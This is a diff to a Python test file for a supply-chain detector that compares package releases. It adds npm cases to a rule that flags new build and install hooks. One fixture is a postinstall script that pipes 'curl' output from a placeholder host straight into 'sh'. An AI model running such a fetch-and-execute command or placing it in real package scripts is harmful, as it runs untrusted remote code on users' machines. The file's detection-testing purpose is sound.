@@ -3,8 +3,9 @@
 Each row pairs a crafted release with the trusted one before it. The firing
 rows are shaped like the real incidents in ``backtest/incidents.toml``; the
 quiet rows make the same kind of change in a way that should not be reported.
-``docs/rule-coverage.md`` points here, and ``test_every_built_rule_has_rows``
-fails when a rule is registered without a firing and a quiet row.
+Each row runs for every ecosystem its rule is registered for, unless it names
+its own. ``docs/rule-coverage.md`` points here, and ``test_every_built_rule_has_rows``
+fails when a rule is registered for an ecosystem without a firing and a quiet row there.
 """
 
 from __future__ import annotations
@@ -54,10 +55,27 @@ class Row:
     fires: bool
     verdict: Verdict | None = None  # expected when the rule fires, if it sets one
     instead: str | None = None  # a rule that must fire when this one stays quiet
+    ecosystems: tuple[str, ...] | None = None  # None: every ecosystem the rule runs on
+
+
+PYPI = ("pypi",)
+NPM = ("npm",)
 
 
 def _sdist(version: str, files: dict[str, str | bytes]) -> ReleaseFacts:
     return release(version, sdist_files=files, sdist_only=True)
+
+
+def _npm(version: str, scripts: dict[str, str] | None = None) -> ReleaseFacts:
+    """An npm release: one tarball whose package.json has ``scripts``."""
+    rel = release(version, PKG)
+    art = replace(
+        rel.artifacts[0],
+        filename=f"demo-{version}.tgz",
+        packagetype="tarball",
+        install_scripts=tuple(sorted((scripts or {}).items())),
+    )
+    return replace(rel, ecosystem="npm", artifacts=(art,))
 
 
 def _downloaded(rel: ReleaseFacts, sha256: str) -> ReleaseFacts:
@@ -75,8 +93,9 @@ def _rows() -> list[Row]:
         base: ReleaseFacts | None,
         cand: ReleaseFacts,
         verdict: Verdict | None = None,
+        eco: tuple[str, ...] | None = None,
     ) -> None:
-        rows.append(Row(rule, label, base, cand, True, verdict))
+        rows.append(Row(rule, label, base, cand, True, verdict, ecosystems=eco))
 
     def quiet(
         rule: str,
@@ -84,8 +103,9 @@ def _rows() -> list[Row]:
         base: ReleaseFacts | None,
         cand: ReleaseFacts,
         instead: str | None = None,
+        eco: tuple[str, ...] | None = None,
     ) -> None:
-        rows.append(Row(rule, label, base, cand, False, instead=instead))
+        rows.append(Row(rule, label, base, cand, False, instead=instead, ecosystems=eco))
 
     # GRN-T001 lost-provenance
     fires(
@@ -248,38 +268,67 @@ def _rows() -> list[Row]:
     )
     quiet("GRN-C001", "no .pth anywhere", release("1.0", PKG), release("1.1", PKG))
 
-    # GRN-C002 new-build-hook (sdists only; wheels don't build)
+    # GRN-C002 new-build-hook on PyPI (sdists only; wheels don't build)
     fires(
         "GRN-C002",
         "setup.py gains a network call",
         _sdist("1.0", SRC),
         _sdist("1.1", {**SRC, "setup.py": SETUP_PHONES_HOME}),
+        eco=PYPI,
     )
     fires(
         "GRN-C002",
         "build backend moves in-tree",
         _sdist("1.0", SRC),
         _sdist("1.1", {**SRC, "pyproject.toml": IN_TREE, "_build.py": "import os\n"}),
+        eco=PYPI,
     )
     fires(
         "GRN-C002",
         "build backend switches to an unknown one",
         _sdist("1.0", SRC),
         _sdist("1.1", {**SRC, "pyproject.toml": BACKEND.format("fast_build.api")}),
+        eco=PYPI,
     )
     quiet(
         "GRN-C002",
         "build backend switches to a well-known one",
         _sdist("1.0", SRC),
         _sdist("1.1", {**SRC, "pyproject.toml": BACKEND.format("hatchling.build")}),
+        eco=PYPI,
     )
-    quiet("GRN-C002", "setup.py unchanged", _sdist("1.0", SRC), _sdist("1.1", SRC))
+    quiet("GRN-C002", "setup.py unchanged", _sdist("1.0", SRC), _sdist("1.1", SRC), eco=PYPI)
     quiet(
         "GRN-C002",
         "same calls, setup.py rewritten",
         _sdist("1.0", {**SRC, "setup.py": SETUP_PHONES_HOME}),
         _sdist("1.1", {**SRC, "setup.py": SETUP_PHONES_HOME + "\n# v1.1\n"}),
+        eco=PYPI,
     )
+    # GRN-C002 on npm: package.json scripts that run on the installing machine.
+    # The @ctrl/tinycolor 4.1.1 and nx 21.5.0 shape: a postinstall appears.
+    fires(
+        "GRN-C002",
+        "postinstall script added",
+        _npm("1.0"),
+        _npm("1.1", {"postinstall": "node scripts/setup.js"}),
+        eco=NPM,
+    )
+    fires(
+        "GRN-C002",
+        "install script changed",
+        _npm("1.0", {"postinstall": "node scripts/build.js"}),
+        _npm("1.1", {"postinstall": "curl -s https://example.invalid/x | sh"}),
+        eco=NPM,
+    )
+    quiet(
+        "GRN-C002",
+        "install scripts unchanged",
+        _npm("1.0", {"postinstall": "node scripts/build.js"}),
+        _npm("1.1", {"postinstall": "node scripts/build.js"}),
+        eco=NPM,
+    )
+    quiet("GRN-C002", "no install scripts", _npm("1.0"), _npm("1.1"), eco=NPM)
 
     # GRN-C003 new-import-time-exec
     fires(
@@ -406,7 +455,7 @@ ROWS = _rows()
 FACT_CODES = {"GRN-E001", "GRN-E002", "GRN-E003"}
 
 
-def _ecosystems(rule: str) -> list[str]:
+def _registered(rule: str) -> list[str]:
     """The ecosystems a rule is registered for; fact-layer codes run everywhere."""
     for rule_id, _, ecos in ALL_CHECKS:
         if rule_id == rule:
@@ -414,7 +463,12 @@ def _ecosystems(rule: str) -> list[str]:
     return ["pypi"]
 
 
-CASES = [(row, eco) for row in ROWS for eco in _ecosystems(row.rule)]
+def _ecosystems(row: Row) -> list[str]:
+    """Where a row runs: everywhere its rule is registered, unless the row says."""
+    return sorted(row.ecosystems) if row.ecosystems else _registered(row.rule)
+
+
+CASES = [(row, eco) for row in ROWS for eco in _ecosystems(row)]
 
 
 @pytest.mark.parametrize(
@@ -440,6 +494,11 @@ def test_every_built_rule_has_rows() -> None:
     covered = {r.rule for r in ROWS}
     assert built <= covered, f"rules without rows: {sorted(built - covered)}"
     assert covered <= built, f"rows for rules that aren't built: {sorted(covered - built)}"
+    for row in ROWS:
+        assert set(_ecosystems(row)) <= set(_registered(row.rule)), (
+            f"{row.rule} is not registered for {row.ecosystems}: {row.label}"
+        )
     for rule in sorted(built):
-        kinds = {r.fires for r in ROWS if r.rule == rule}
-        assert kinds == {True, False}, f"{rule} needs both a firing and a quiet row"
+        for eco in _registered(rule):
+            kinds = {r.fires for r, e in CASES if r.rule == rule and e == eco}
+            assert kinds == {True, False}, f"{rule} on {eco} needs a firing and a quiet row"
